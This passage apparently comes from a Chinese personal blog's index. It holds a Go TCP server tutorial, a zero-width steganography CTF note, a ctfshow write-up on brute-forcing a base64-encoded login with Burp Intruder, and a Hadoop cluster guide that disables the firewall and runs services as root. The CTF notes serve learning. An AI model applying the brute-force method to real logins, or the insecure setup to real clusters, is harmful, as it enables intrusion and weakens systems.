//server.go<br>  package main  import (<pre><code>  &quot;fmt&quot;  &quot;net&quot;</code></pre>  )  type Server struct {<pre><code>  Ip   string  Port int</code></pre>  }  // 创建一个server的接口，类似于一个构造器<br>  func NewServer(ip string, port int) *Server {<pre><code>  server := &amp;Server&#123;      Ip:   ip,      Port: port,  &#125;  return server</code></pre>  }  func (this *Server) Handler(conn net.Conn){<pre><code>  //当前的链接的业务  fmt.Println(&quot;链接建立成功&quot;)</code></pre>  }  // 启动服务器的接口,给当前类绑定一个方法<br>  func (this *Server) Start() {<pre><code>  //socket listen  listener,err := net.Listen(&quot;tcp&quot;, fmt.Sprintf(&quot;%s:%d&quot;,this.Ip,this.Port))  if err != nil &#123;      fmt.Println(&quot;net.Listen err&quot;,err)      return  &#125;  //close listen socket  defer listener.Close()  //accept  for &#123;      conn,err := listener.Accept()      if err != nil &#123;          fmt.Println(&quot;listener accept err:&quot;,err)          continue      &#125;      go this.Handler(conn)  &#125;  //do handler  //close listen socket</code></pre>  }  <pre class="line-numbers language-none"><code class="language-none">9.   &#96;&#96;&#96;go     &#x2F;&#x2F;main.go     package main          func main() &#123;     server :&#x3D; NewServer(&quot;127.0.0.1&quot;,8080)     server.Start()     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="用户上线及广播功能"><a href="#用户上线及广播功能" class="headerlink" title="用户上线及广播功能"></a>用户上线及广播功能</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221104111016.png"></p><ol><li>  OnlineMap展示当前有哪些用户上线，总的上线用户表</li><li>  一个user类表示一个客户端，每一个user类都会绑定一个channel，一旦channel中有消息，就会自动发送给绑定的client</li><li>  message类来处理广播的需要，message中有一个goroutine,不断地监听信息，一旦有消息，就遍历onlinemap,发送给onlinemap中的每一个用户</li><li></li></ol><h2 id="Conn接口"><a href="#Conn接口" class="headerlink" title="Conn接口"></a>Conn接口</h2><ol><li>  conn接口代表通用的面向流的网络链接，多个线程可能会同时调用同一个Conn方法</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221104171720.png"></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零宽度隐写</title>
      <link href="/%E9%9B%B6%E5%AE%BD%E5%BA%A6%E9%9A%90%E5%86%99/"/>
      <url>/%E9%9B%B6%E5%AE%BD%E5%BA%A6%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="零宽度隐写"><a href="#零宽度隐写" class="headerlink" title="零宽度隐写"></a>零宽度隐写</h1><ol><li><p>  零宽度隐写是一些不可见，不可打印的字符，存在于页面中用于调整页面的格式</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006194026.png"></p></li><li><pre><code>  零宽度空格符 (zero-width space) U+200B : 用于较长单词的换行分隔  零宽度非断空格符 (zero-width no-break space) U+FEFF : 用于阻止特定位置的换行分隔  零宽度连字符 (zero-width joiner) U+200D : 用于阿拉伯文与印度语系等文字中，使不会发生连字的字符间产生连字效果  零宽度断字符 (zero-width non-joiner) U+200C : 用于阿拉伯文，德文，印度语系等文字中，阻止会发生连字的字符间的连字效果  左至右符 (left-to-right mark) U+200E : 用于在混合文字方向的多种语言文本中（例：混合左至右书写的英语与右至左书写的希伯来语），规定排版文字书写方向为左至右  右至左符 (right-to-left mark) U+200F : 用于在混合文字方向的多种语言文本中，规定排版文字书写方向为右至左 </code></pre></li><li><p>  将文本内容复制到以下链接中</p></li><li><p>  <a href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006194424.png"></p></li><li><p>  然后将得到的字符进行base58解码</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006194515.png"></p></li><li><p>  最后得到的一串类似于hex编码，用hex去解码</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006194554.png"></p></li><li><p>  我只能说学到了学到了</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破真题</title>
      <link href="/%E7%88%86%E7%A0%B4%E7%9C%9F%E9%A2%98/"/>
      <url>/%E7%88%86%E7%A0%B4%E7%9C%9F%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow爆破真题"><a href="#ctfshow爆破真题" class="headerlink" title="ctfshow爆破真题"></a>ctfshow爆破真题</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><ol><li>  打开之后发现有一个登录框，随便输入一个，抓包</li><li>  发现用户名和密码是base64加密的</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221002160438.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221002160418.png"></li><li>  send to intruder开始爆破</li><li>  加载题目给的字典，题目给的是后缀，（我也不知道为啥默认的用户名是admin）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221002160805.png"></li><li>  添加前缀，前缀为 <strong>admin:</strong></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221002160845.png"></li><li>  添加编码</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221002161004.png"></li><li>  添加flag前缀，这样会着重看包含此字样的流量包</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221002162526.png"></li><li>  找那种状态码很不一样的（至少不是401）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221002161447.png"></li><li>  将选项由请求转为相应包，查看到flag</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221002161719.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop完全分布式搭建</title>
      <link href="/Hadoop%E5%AE%8C%E5%85%A8%E5%88%86%E5%B8%83%E5%BC%8F%E6%90%AD%E5%BB%BA/"/>
      <url>/Hadoop%E5%AE%8C%E5%85%A8%E5%88%86%E5%B8%83%E5%BC%8F%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="Hadoop完全分布式搭建"><a href="#Hadoop完全分布式搭建" class="headerlink" title="Hadoop完全分布式搭建"></a>Hadoop完全分布式搭建</h1><h2 id="集群部署规划"><a href="#集群部署规划" class="headerlink" title="集群部署规划"></a>集群部署规划</h2><table><thead><tr><th></th><th><em><strong>*Master*</strong></em></th><th><em><strong>*Slave1*</strong></em></th><th align="left"><em><strong>*Slave2*</strong></em></th></tr></thead><tbody><tr><td>IP</td><td>192.168.1.10</td><td>192.168.1.1</td><td align="left">192.168.1.2</td></tr><tr><td>HDFS</td><td>NameNodeSecondaryNameNode</td><td>DataNode</td><td align="left">DataNode</td></tr><tr><td>YARN</td><td>ResourceManager</td><td>NodeManager</td><td align="left">NodeManager</td></tr></tbody></table><h2 id="生成master虚拟机"><a href="#生成master虚拟机" class="headerlink" title="生成master虚拟机"></a>生成master虚拟机</h2><pre class="line-numbers language-none"><code class="language-none">从最原始的origin主机（关机状态）复制一台虚拟机，虚拟机名为master。origin主机相关信息如下：内存：2G硬盘：30G OS：ubuntu(64位)共享设置完成root用户登录ifconfig和vim安装完成vim创建了下面两个文件夹&#x2F;root&#x2F;downloads 文件夹里存放安装包&#x2F;root&#x2F;bigdata 文件夹里存放安装文件（即解压缩后的文件）防火墙关闭:sudo ufw disable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="修改master的网卡、虚拟机名、IP地址和主机名"><a href="#修改master的网卡、虚拟机名、IP地址和主机名" class="headerlink" title="修改master的网卡、虚拟机名、IP地址和主机名"></a>修改master的网卡、虚拟机名、IP地址和主机名</h2><pre class="line-numbers language-none"><code class="language-none">（1）master关机状态下修改网卡，参见课本P82，其中P82的图4.7中的网卡2选择“网络地址转换(NAT)”;master关机状态下修改虚拟机名，参见课本P83（2）master开机状态下修改IP地址和主机名，IP等信息见上表，操作步骤可参见课本P84-85修改IP地址：root@hadoop:~# vim &#x2F;etc&#x2F;network&#x2F;interfaces添加以下内容：auto enp0s3iface enp0s3 inet staticaddress  192.168.1.10netmask  255.255.255.0broadcast 192.168.1.255重启网络：root@hadoop:~# &#x2F;etc&#x2F;init.d&#x2F;networking restart修改主机名：root@hadoop:~# vim &#x2F;etc&#x2F;hostname将原来内容删除，改为master.(3)重启reboot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置-etc-hosts"><a href="#配置-etc-hosts" class="headerlink" title="配置/etc/hosts"></a>配置/etc/hosts</h2><pre class="line-numbers language-none"><code class="language-none">root@master:~# vim &#x2F;etc&#x2F;hosts192.168.1.10  master192.168.1.1  slave1192.168.1.2  slave2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置-SSH-免密登录"><a href="#配置-SSH-免密登录" class="headerlink" title="配置**SSH**免密登录****"></a>配置*<strong><strong><strong>*SSH*</strong></strong></strong>*免密登录****</h2><pre class="line-numbers language-none"><code class="language-none">（1）安装SSHroot@ master:~&#x2F;bigdata# apt-get install ssh(2)设置免密登录1）生成公钥和密钥对root@ master:~&#x2F;bigdata# ssh-keygen -t rsa一路回车（三个）即可。2）查看生成的公钥和私钥。root@ master:~&#x2F;bigdata# ll ~&#x2F;.ssh3）将密钥加入到公钥中root@master:~&#x2F;bigdata# cat ~&#x2F;.ssh&#x2F;id_rsa.pub &gt;&gt; ~&#x2F;.ssh&#x2F;authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220928194133.png"></p><h2 id="复制master产生slave1和slave2并进行配置"><a href="#复制master产生slave1和slave2并进行配置" class="headerlink" title="复制master产生slave1和slave2并进行配置"></a>复制master产生slave1和slave2并进行配置</h2><pre class="line-numbers language-none"><code class="language-none">1）将master关机再复制！！！（2）slave1开机，修改IP地址（192.168.1.1）和主机名修改IP地址：root@ master:~# vim &#x2F;etc&#x2F;network&#x2F;interfaces重启网络：root@ master:~# &#x2F;etc&#x2F;init.d&#x2F;networking restart修改主机名：root@ master:~# vim &#x2F;etc&#x2F;hostname重启slave1，reboot（3）slave2开机，修改IP地址（192.168.1.2）和主机名； （4）重启slave2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="设置master到master、slave1和slave2的SSH免密登录"><a href="#设置master到master、slave1和slave2的SSH免密登录" class="headerlink" title="设置master到master、slave1和slave2的SSH免密登录"></a>设置master到master、slave1和slave2的SSH免密登录</h2><pre class="line-numbers language-none"><code class="language-none">（1）启动三个节点（2）在master节点连接到master节点  root@master:~# ssh master  exit退出（3）在master节点连接到slave1节点  root@master:~# ssh slave1  exit退出（4）在master节点连接到slave2节点  root@master:~# ssh slave2exit退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h2><ol><li><p>  <em><strong>*通过共享文件夹的方式将j*</strong></em><em><strong>*d*</strong></em><em><strong>*k的安装包放在ma*</strong></em><em><strong>*ster*</strong></em><em><strong>*节点的/*</strong></em><em><strong>*root/downloads*</strong></em><em><strong>*文件夹下*</strong></em></p></li><li><p>  <em><strong>*解压J*</strong></em><em><strong>*DK*</strong></em> <em><strong>*到*</strong></em> <em><strong>*/root/bigdata*</strong></em><em><strong>*目录下*</strong></em></p></li><li><p>```<br>  root@master:/media/sf_virtualbox-share# cp jdk-8u191-linux-x64.tar.gz /root/downloads<br>  root@master:/media/sf_virtualbox-share# cd /root/downloads<br>  root@master:<del>/downloads# tar -zxvf jdk-8u191-linux-x64.tar.gz -C /root/bigdata/  (这里的C必须大写)<br>  回到/root/bigdata目录下查看：<br>  root@ master:</del>/downloads# cd /root/bigdata/<br>  root@ master:~/bigdata# </p>  <pre class="line-numbers language-none"><code class="language-none">4.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220928195423.png)5.   将解压后的jdk1.8.0_191文件包复制到slave1和slave26.   &#96;&#96;&#96;     root@master:~&#x2F;bigdata# scp -r &#x2F;root&#x2F;bigdata&#x2F;jdk1.8.0_191&#x2F; root@slave1:&#x2F;root&#x2F;bigdata&#x2F;     root@master:~&#x2F;bigdata# scp -r &#x2F;root&#x2F;bigdata&#x2F;jdk1.8.0_191&#x2F; root@slave2:&#x2F;root&#x2F;bigdata&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="配置JDK环境变量"><a href="#配置JDK环境变量" class="headerlink" title="配置JDK环境变量"></a>配置JDK环境变量</h2><ol><li><p>  在 /etc/profile 里配置JDK的环境变量。打开该文件：</p></li><li><p>```<br>  root@ master:~/bigdata# vim /etc/profile // /etc/profile这个文件是用来存放环境变量的</p>  <pre class="line-numbers language-none"><code class="language-none">3.   shift+g到文件末尾，按i进入插入状态，加入JDK路径：4.   &#96;&#96;&#96;     # JAVA_HOME     export JAVA_HOME&#x3D;&#x2F;root&#x2F;bigdata&#x2F;jdk1.8.0_191     export  PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin     export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre     export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220928200539.png"></p></li><li><p>  将配置文件复制到slave1和slave2</p></li><li><p>```<br>  root@master:<del># scp -r /etc/profile root@slave1:/etc/<br>  root@master:</del># scp -r /etc/profile root@slave2:/etc/</p>  <pre class="line-numbers language-none"><code class="language-none">8.   使修改后的文件生效（三个节点都要做）9.   &#96;&#96;&#96;     root@master:~#  source &#x2F;etc&#x2F;profile     root@slave1:~#  source &#x2F;etc&#x2F;profile     root@slave2:~#  source &#x2F;etc&#x2F;profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="安装Hadoop"><a href="#安装Hadoop" class="headerlink" title="安装Hadoop"></a>安装Hadoop</h2><ol><li><p>  通过共享文件夹的方式将hadoop的安装包放在master节点的/root/downloads文件夹下</p></li><li><p>  解压hadoop到/root/bigdata目录下</p></li><li><p>```<br>  root@master:/media/sf_virtualbox-share# cp hadoop-3.1.1.tar.gz /root/downloads<br>  root@master:/media/sf_virtualbox-share# cd /root/downloads</p><p>  root@master:~/downloads# tar -zxvf hadoop-3.1.1.tar.gz -C /root/bigdata/ (这里的C必须大写)</p>  <pre class="line-numbers language-none"><code class="language-none">4.   将解压后的hadoop文件包复制到slave1和slave2(解压后的文件放到&#x2F;bigdata中，没解压的压缩包放到&#x2F;downloads)5.   配置Hadoop环境变量6.   在&#x2F;etc&#x2F;profile文件中配置JDK的环境变量7.   &#96;&#96;&#96;     vim &#x2F;etc&#x2F;profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  在文件的末尾加入hadoop路径</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220928213153.png"></p></li><li><p>```</p><h1 id="HADOOP-HOME"><a href="#HADOOP-HOME" class="headerlink" title="HADOOP_HOME"></a>HADOOP_HOME</h1><p>  export HADOOP_HOME=/root/bigdata/hadoop-3.1.1<br>  export PATH=$PATH:$HADOOP_HOME/bin<br>  export PATH=$PATH:$HADOOP_HOME/sbin<br>  export HADOOP_MAPRED_HOME=$HADOOP_HOME<br>  export HADOOP_COMMON_HOME=$HADOOP_HOME<br>  export HADOOP_HDFS_HOME=$HADOOP_HOME<br>  export YARN_HOME=$HADOOP_HOME<br>  export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native<br>  export HADOOP_OPTS=”-Djava.library.path=$HADOOP_HOME/lib:$HADOOP_COMMON_LIB_NATIVE_DIR”<br>  export JAVA_LIBRARY_PATH=$HADOOP_HOME/lib/native:$JAVA_LIBRARY_PATH</p>  <pre class="line-numbers language-none"><code class="language-none">11.   保存文件并退出，将配置文件scp到slave1和slave212.   &#96;&#96;&#96;      root@master:~# scp -r &#x2F;etc&#x2F;profile root@slave1:&#x2F;etc&#x2F;      root@master:~# scp -r &#x2F;etc&#x2F;profile root@slave2:&#x2F;etc&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  ④ 使修改后的文件生效(三个节点都 做)：</p></li><li><p>```<br>  root@master:<del>#  source /etc/profile<br>  root@slave1:</del>#  source /etc/profile<br>  root@slave2:~#  source /etc/profile</p>  <pre class="line-numbers language-none"><code class="language-none">15.   查看hadoop是否安装成功，在任意路径下输入以下命令来查看hadoop版本16.   &#96;&#96;&#96;      hadoop version &#x2F;&#x2F;注意，这个地方没有-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220928213624.png"></p><h2 id="配置hadoop配置文件（在master节点）"><a href="#配置hadoop配置文件（在master节点）" class="headerlink" title="配置hadoop配置文件（在master节点）"></a>配置hadoop配置文件（在master节点）</h2><ol><li><p>  在/root/bigdata/hadoop-3.1.1/etc/hadoop/ 目录下找到所有的配置文件并修改</p></li><li><p>```<br>  root@master:~# cd /root/bigdata/hadoop-3.1.1/etc/hadoop/</p>  <pre class="line-numbers language-none"><code class="language-none">3.   创建相关需要的文件夹（三个节点都创建）4.   &#96;&#96;&#96;     root@master:~&#x2F;bigdata&#x2F;hadoop-3.1.1# mkdir datanode_1_dir     root@master:~&#x2F;bigdata&#x2F;hadoop-3.1.1# mkdir -p hadoop_data&#x2F;hdfs&#x2F;namenode     root@master:~&#x2F;bigdata&#x2F;hadoop-3.1.1# mkdir -p hadoop_data&#x2F;hdfs&#x2F;datanode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220928214509.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220928214913.png"></p></li><li><p>  hadoop-env.sh</p></li><li><p>```<br>  root@master:~/bigdata/hadoop-3.1.1/etc/hadoop# vim hadoop-env.sh<br>  去掉export JAVA_HOME的注释并修改路径：</p><pre><code>   export JAVA_HOME=/root/bigdata/jdk1.8.0_191</code></pre><p>  再添加以下代码：<br>  export HDFS_NAMENODE_USER=root<br>  export HDFS_DATANODE_USER=root<br>  export HDFS_SECONDARYNAMENODE_USER=root<br>  export YARN_RESOURCEMANAGER_USER=root<br>  export YARN_NODEMANAGER_USER=root</p>  <pre class="line-numbers language-none"><code class="language-none">9.   配置core-site.xml10.   &#96;&#96;&#96;xml      &lt;configuration&gt;         &lt;!-- 配置NameNode节点的地址和端口号 --&gt;         &lt;property&gt;             &lt;name&gt;fs.defaultFS&lt;&#x2F;name&gt;             &lt;value&gt;hdfs:&#x2F;&#x2F;master:9000&lt;&#x2F;value&gt;         &lt;&#x2F;property&gt;               &lt;!-- hadoop的临时目录，用来存放hadoop运行时产生的临时文件  --&gt;         &lt;property&gt;              &lt;name&gt;hadoop.tmp.dir&lt;&#x2F;name&gt;              &lt;value&gt;&#x2F;root&#x2F;bigdata&#x2F;hadoop-3.1.1&#x2F;datanode_1_dir&lt;&#x2F;value&gt;         &lt;&#x2F;property&gt;         &lt;&#x2F;configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  配置yarn-site.xml</p></li><li><p>```xml</p>  <configuration>  <!-- 用户自定义服务，Reducer获取数据的方式扩展MR的shuffle功能 -->  <property>       <name>yarn.nodemanager.aux-services</name>       <value>mapreduce_shuffle</value>  </property>    <!-- 指定YARN的ResourceManager的地址 -->  <property>  <name>yarn.resourcemanager.hostname</name>  <value>master</value>  </property>    <property>  <name>yarn.application.classpath</name>  <value>/root/bigdata/hadoop-3.1.1/etc/hadoop:/root/bigdata/hadoop-3.1.1/share/hadoop/common/lib/*:/root/bigdata/hadoop-3.1.1/share/hadoop/common/*:/root/bigdata/hadoop-3.1.1/share/hadoop/hdfs:/root/bigdata/hadoop-3.1.1/share/hadoop/hdfs/lib/*:/root/bigdata/hadoop-3.1.1/share/hadoop/hdfs/*:/root/bigdata/hadoop-3.1.1/share/hadoop/mapreduce/lib/*:/root/bigdata/hadoop-3.1.1/share/hadoop/mapreduce/*:/root/bigdata/hadoop-3.1.1/share/hadoop/yarn:/root/bigdata/hadoop-3.1.1/share/hadoop/yarn/lib/*:/root/bigdata/hadoop-3.1.1/share/hadoop/yarn/*</value>  </property>  <pre><code>  &lt;property&gt;          &lt;name&gt;yarn.nodemanager.vmem-check-enabled&lt;/name&gt;          &lt;value&gt;false&lt;/value&gt;  &lt;/property&gt;</code></pre>  </configuration>  <pre class="line-numbers language-none"><code class="language-none">13.   配置mapred-site.xml14.   &#96;&#96;&#96;xml      &lt;configuration&gt;      &lt;!-- 指定MR运行在YARN上 ，取值可为local,classic,yarn之一 --&gt;      &lt;property&gt;      &lt;name&gt;mapreduce.framework.name&lt;&#x2F;name&gt;              &lt;value&gt;yarn&lt;&#x2F;value&gt;      &lt;&#x2F;property&gt;              &lt;property&gt;              &lt;name&gt;mapred.job.tracker&lt;&#x2F;name&gt;              &lt;value&gt;master:54311&lt;&#x2F;value&gt;         &lt;&#x2F;property&gt;      &lt;&#x2F;configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  配置hdfs-site.xml</p></li><li><p>```xml</p>  <configuration>  <!-- 指定HDFS副本的数量 -->  <property>        <name>dfs.replication</name>        <value>2</value>  </property>    <!-- 指定HDFS中NameNode的本地存储位置-->  <property>        <name>dfs.namenode.name.dir</name>        <value>file:///root/bigdata/hadoop-3.1.1/hadoop_data/hdfs/namenode</value>  </property>    <!-- 指定HDFS中DataNode的本地存储位置-->  <property>        <name>dfs.datanode.data.dir</name>        <value>file:///root/bigdata/hadoop-3.1.1/hadoop_data/hdfs/datanode</value>  </property>    <!-- 指定HDFS对应的HTTP服务器地址和端口 -->  <property>       <name>dfs.http.address</name>       <value>master:50070</value>    </property>  <property>      <name>dfs.namenode.secondary.http-address</name>      <value>master:9870</value>    </property>    </configuration>  <pre class="line-numbers language-none"><code class="language-none">17.   配置master文件,这是一个新建文件，将主节点 master 写入进去，以指明哪个节点是NameNode18.   配置workers,指明哪些是DataNode19.   &#96;&#96;&#96;      root@master:~&#x2F;bigdata&#x2F;hadoop-3.1.1&#x2F;etc&#x2F;hadoop# vim workers      将所有的DataNode节点的主机名写进去，一个占一行。      slave1      slave2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  将hadoop相关配置复制到slave1和slave2上</p></li><li><p>```<br>  scp -r /root/bigdata/hadoop-3.1.1/etc/hadoop/ root@slave1:/root/bigdata/hadoop-3.1.1/etc/<br>  scp -r /root/bigdata/hadoop-3.1.1/etc/hadoop/ root@slave2:/root/bigdata/hadoop-3.1.1/etc/</p>  <pre class="line-numbers language-none"><code class="language-none">## 在master上格式化Namenode1.   &#96;&#96;&#96;     root@master:~&#x2F;bigdata&#x2F;hadoop-3.1.1&#x2F;bin# hdfs namenode -format<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注：在格式化之前，首先要查看是否有一些临时文件夹，如果有（一般是之前格式化产生的），需要删除。这些临时文件有：</p><p>  <em><strong>*/root/ bigdata/hadoop-3.1.1/*</strong></em><em><strong>*datanode_1_dir*</strong></em>  <em><strong>*里面的全部内容*</strong></em></p><p>  <em><strong>*/root/ bigdata/hadoop-3.1.1/*</strong></em><em><strong>*log*</strong></em><em><strong>*s*</strong></em>  <em><strong>*整个l*</strong></em><em><strong>*ogs*</strong></em><em><strong>*文件夹*</strong></em></p><p>  <em><strong>*/root/ bigdata/hadoop-3.1.1/*</strong></em><em><strong>*h*</strong></em><em><strong>*adoop_data/hdfs*</strong></em><em><strong>*/*</strong></em><em><strong>*namenode*</strong></em>  <em><strong>*里面的全部内容*</strong></em></p><p>  <em><strong>*/root/ bigdata/hadoop-3.1.1/*</strong></em><em><strong>*h*</strong></em><em><strong>*adoop_data/hdfs*</strong></em><em><strong>*/*</strong></em><em><strong>*datanode*</strong></em>  <em><strong>*里面的全部内容*</strong></em></p></li><li><p>将这四项删除，再格式化，否则datanode可能不显示。</p><p>  在可视化的方式下删除，找到，直接DELETE键删除即可。三个节点都删除。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220928220717.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220928220726.png"></p></li></ol><h2 id="web端查看HDFS文件系统和YARN"><a href="#web端查看HDFS文件系统和YARN" class="headerlink" title="web端查看HDFS文件系统和YARN"></a>web端查看HDFS文件系统和YARN</h2><ol><li>查看hdfs，在Ubuntu内的火狐浏览器的地址栏中输入</li><li>```<br>  <a href="http://master:50070/">http://master:50070</a>  <pre class="line-numbers language-none"><code class="language-none">3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220929174609.png)4.   查看yarn，在浏览器中输入5.   &#96;&#96;&#96;     http:&#x2F;&#x2F;master:8088&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220929174657.png"></li></ol></li></ol><h2 id="在hadoop集群中运行程序"><a href="#在hadoop集群中运行程序" class="headerlink" title="在hadoop集群中运行程序"></a>在hadoop集群中运行程序</h2><ol><li><p>  master中进入到下面的目录</p></li><li><p>```<br>  root@master:~/bigdata/hadoop-3.1.1/share/hadoop/mapreduce#</p>  <pre class="line-numbers language-none"><code class="language-none">3.   执行程序4.   &#96;&#96;&#96;     root@master:~&#x2F;bigdata&#x2F;hadoop-3.1.1&#x2F;share&#x2F;hadoop&#x2F;mapreduce# hadoop jar .&#x2F;hadoop-mapreduce-examples-3.1.1.jar pi 10 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220929175016.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220929175114.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023DebuGGer战队——迎新赛题解——Web部分</title>
      <link href="/%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
      <url>/%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
      
